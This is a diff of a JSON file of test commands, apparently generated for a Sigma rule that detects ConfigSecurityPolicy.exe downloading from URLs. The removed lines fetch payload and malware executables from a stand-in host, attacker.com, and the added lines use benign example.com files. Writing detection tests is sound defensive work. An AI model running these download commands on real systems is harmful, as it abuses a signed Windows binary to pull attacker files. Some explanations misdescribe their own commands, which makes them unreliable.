@@ -1,42 +1,22 @@
 [
   {
-    "output": "ConfigSecurityPolicy.exe http://attacker.com/file.exe",
-    "explanation": "This command represents a direct match to the Sigma rule's detection criteria, as it includes the use of ConfigSecurityPolicy.exe with an HTTP URL in the command line."
+    "output": "ConfigSecurityPolicy.exe /url http://example.com/file.txt",
+    "explanation": "This command simulates a benign use of ConfigSecurityPolicy.exe with a URL parameter that matches the Sigma rule's detection criteria. It uses a standard HTTP URL to trigger the rule while remaining safe for testing."
   },
   {
-    "output": "ConfigSecurityPolicy.exe ftp://attacker.com/payload.exe",
-    "explanation": "This command uses an FTP URL, which is also covered by the Sigma rule's detection criteria. It demonstrates a valid test case for the rule."
+    "output": "ConfigSecurityPolicy.exe -url https://example.com/file.txt",
+    "explanation": "This command uses the HTTPS protocol instead of HTTP, demonstrating a safe mutation via substitution of the URL scheme while still matching the Sigma rule's detection logic."
   },
   {
-    "output": "ConfigSecurityPolicy.exe https://attacker.com/malware.exe",
-    "explanation": "This command uses HTTPS, which is included in the Sigma rule's detection logic. It is a valid test case for verifying detection."
+    "output": "ConfigSecurityPolicy.exe --url ftp://example.com/file.txt",
+    "explanation": "This command uses the FTP protocol and long-form option syntax to demonstrate reordering and substitution. It still matches the Sigma rule's detection criteria."
   },
   {
-    "output": "ConfigSecurityPolicy.exe -Url http://attacker.com/data.exe",
-    "explanation": "This command adds a hypothetical flag (-Url) to simulate a scenario where the URL is passed as a named parameter. It is a safe mutation for testing."
+    "output": "ConfigSecurityPolicy.exe url=http://example.com/file.txt",
+    "explanation": "This command uses an alternative syntax (key=value) to pass the URL parameter, demonstrating safe mutation via recoding. It still matches the Sigma rule's detection logic."
   },
   {
-    "output": "ConfigSecurityPolicy.exe \"http://attacker.com/evil.exe\"",
-    "explanation": "This command uses quotes around the URL, a safe insertion technique to test whether the Sigma rule can detect the command despite formatting changes."
-  },
-  {
-    "output": "ConfigSecurityPolicy.exe http://attacker.com/\\file.exe",
-    "explanation": "This command uses a double backslash in the URL path, a safe mutation to test whether the Sigma rule can detect the command despite path normalization attempts."
-  },
-  {
-    "output": "ConfigSecurityPolicy.exe http://attacker.com payload.exe",
-    "explanation": "This command omits the file extension from the URL, a safe omission technique to test whether the Sigma rule can detect the command despite this change."
-  },
-  {
-    "output": "ConfigSecurityPolicy.exe http://attacker.com/file.exe --verbose",
-    "explanation": "This command adds a verbose flag, a safe addition to test whether the Sigma rule can detect the command despite additional arguments."
-  },
-  {
-    "output": "ConfigSecurityPolicy.exe http://attacker.com/file.exe > output.log",
-    "explanation": "This command appends output redirection, a safe mutation to test whether the Sigma rule can detect the command despite additional shell syntax."
-  },
-  {
-    "output": "ConfigSecurityPolicy.exe http://attacker.com/file.exe 2>&1",
-    "explanation": "This command adds standard error redirection, a safe mutation to test whether the Sigma rule can detect the command despite additional shell syntax."
+    "output": "ConfigSecurityPolicy.exe http://example.com/file.txt",
+    "explanation": "This command omits the explicit parameter name and directly passes the URL as an argument. It demonstrates omission while still matching the Sigma rule's detection criteria."
   }
 ]
